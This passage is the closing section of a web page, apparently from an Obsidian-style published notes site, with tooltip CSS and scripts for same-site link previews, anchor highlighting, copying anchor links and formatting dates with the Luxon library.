  transition: opacity 100ms;
  unicode-bidi: plaintext;
  overflow-y: scroll;
  z-index: 10;
}

#tooltip-wrapper:after {
  content: "";
  position: absolute;
  z-index: 1;
  bottom: 0;
  left: 0;
  pointer-events: none;
  width: 100%;
  unicode-bidi: plaintext;
  height: 75px;
}
</style>
<div style="opacity: 0; display: none;" id='tooltip-wrapper'>
  <div id='tooltip-content'>
  </div>
</div>

<iframe style="display: none; height: 0; width: 0;" id='link-preview-iframe' src="">
</iframe>

<script>
  var opacityTimeout;
  var contentTimeout;
  var transitionDurationMs = 100;

  var iframe = document.getElementById('link-preview-iframe')
  var tooltipWrapper = document.getElementById('tooltip-wrapper')
  var tooltipContent = document.getElementById('tooltip-content')

  var linkHistories = {};

  function hideTooltip() {
    opacityTimeout = setTimeout(function () {
      tooltipWrapper.style.opacity = 0;
      contentTimeout = setTimeout(function () {
        tooltipContent.innerHTML = '';
        tooltipWrapper.style.display = 'none';
      }, transitionDurationMs + 1);
    }, transitionDurationMs)
  }

  function showTooltip(event) {
    var elem = event.target;
    var elem_props = elem.getClientRects()[elem.getClientRects().length - 1];
    var top = window.pageYOffset || document.documentElement.scrollTop;
    var url = event.target.getAttribute("href");
    if (url.indexOf("http") === -1 || url.indexOf(window.location.host) !== -1) {
      let contentURL = url.split('#')[0]
      if (!linkHistories[contentURL]) {
        iframe.src = contentURL
        iframe.onload = function () {
          tooltipContentHtml = ''
          tooltipContentHtml += '<div style="font-weight: bold; unicode-bidi: plaintext;">' + iframe.contentWindow.document.querySelector('h1').innerHTML + '</div>'
          tooltipContentHtml += iframe.contentWindow.document.querySelector('.content').innerHTML
          tooltipContent.innerHTML = tooltipContentHtml
          linkHistories[contentURL] = tooltipContentHtml
          tooltipWrapper.style.display = 'block';
          tooltipWrapper.scrollTop = 0;
          setTimeout(function () {
            tooltipWrapper.style.opacity = 1;
            if (url.indexOf("#") != -1) {
              let id = url.split('#')[1];
              const focus = tooltipWrapper.querySelector(`[id='${id}']`);
              focus.classList.add('referred');
              console.log(focus);
              focus.scrollIntoView({behavior: 'smooth'}, true)
            } else {
              tooltipWrapper.scroll(0, 0);
            }
          }, 1)
        }
      } else {
        tooltipContent.innerHTML = linkHistories[contentURL]
        tooltipWrapper.style.display = 'block';
        setTimeout(function () {
          tooltipWrapper.style.opacity = 1;
          if (url.indexOf("#") != -1) {
              let id = url.split('#')[1];
              const focus = tooltipWrapper.querySelector(`[id='${id}']`);
              focus.classList.add('referred');
              focus.scrollIntoView({behavior: 'smooth'}, true)
          } else {
              tooltipWrapper.scroll(0, 0);
          }
        }, 1)
      }

      function getInnerWidth(elem) {
        var style = window.getComputedStyle(elem);
        return elem.offsetWidth - parseFloat(style.paddingLeft) - parseFloat(style.paddingRight) - parseFloat(style.borderLeft) - parseFloat(style.borderRight) - parseFloat(style.marginLeft) - parseFloat(style.marginRight);
      }

      tooltipWrapper.style.left = elem_props.left - (tooltipWrapper.offsetWidth / 2) + (elem_props.width / 2) + "px";

      if ((window.innerHeight - elem_props.top) < (tooltipWrapper.offsetHeight)) {
        tooltipWrapper.style.top = elem_props.top + top - tooltipWrapper.offsetHeight - 10 + "px";
      } else if ((window.innerHeight - elem_props.top) > (tooltipWrapper.offsetHeight)) {
        tooltipWrapper.style.top = elem_props.top + top + 35 + "px";
      }

      if ((elem_props.left + (elem_props.width / 2)) < (tooltipWrapper.offsetWidth / 2)) {
        tooltipWrapper.style.left = "10px";
      } else if ((document.body.clientWidth - elem_props.left - (elem_props.width / 2)) < (tooltipWrapper.offsetWidth / 2)) {
        tooltipWrapper.style.left = document.body.clientWidth - tooltipWrapper.offsetWidth - 20 + "px";
      }
    }
  }

  function setupListeners(linkElement) {
    linkElement.addEventListener('mouseleave', function (_event) {
      hideTooltip();
    });

    tooltipWrapper.addEventListener('mouseleave', function (_event) {
      hideTooltip();
    });

    linkElement.addEventListener('mouseenter', function (event) {
      clearTimeout(opacityTimeout);
      clearTimeout(contentTimeout);
      showTooltip(event);
    });

    tooltipWrapper.addEventListener('mouseenter', function (event) {
      clearTimeout(opacityTimeout);
      clearTimeout(contentTimeout);
    });
  }

  window.addEventListener("load", function(event) 
  {
    document.querySelectorAll('.internal-link').forEach(setupListeners);
    document.querySelectorAll('.backlink-card a').forEach(setupListeners);
  });
</script>

    
        <script>
      if (window.location.hash) {
        document.getElementById(window.location.hash.slice(1)).classList.add('referred');
      }
      window.addEventListener('hashchange', (evt) => {
        const oldParts = evt.oldURL.split("#");
        if (oldParts[1]) {
          document.getElementById(oldParts[1]).classList.remove('referred');
        }
        const newParts = evt.newURL.split("#");
        if (newParts[1]) {
          document.getElementById(newParts[1]).classList.add('referred');
        }
      }, false);
      const url_parts = window.location.href.split("#")
      const url = url_parts[0];
      const referrence = url_parts[1];
      document.querySelectorAll(".cm-s-obsidian > *[id]").forEach(function (el) {
        el.ondblclick = function(evt) {
          const ref_url = url + '#' + evt.target.id
          navigator.clipboard.writeText(ref_url);
      }
      });

      
    </script>
    <script src=" https://fastly.jsdelivr.net/npm/luxon@3.2.1/build/global/luxon.min.js "></script>
<script defer>
    TIMESTAMP_FORMAT = "MMM dd, yyyy h:mm a";
    document.querySelectorAll('.human-date').forEach(function (el) {
        el.innerHTML = luxon.DateTime.fromISO(el.getAttribute('data-date') || el.innerText).toFormat(TIMESTAMP_FORMAT);
      });
</script>
    
    
    <script>
lucide.createIcons({
            attrs: {
                class: ["svg-icon"]
            }
        });
</script>
  </body>
</html>
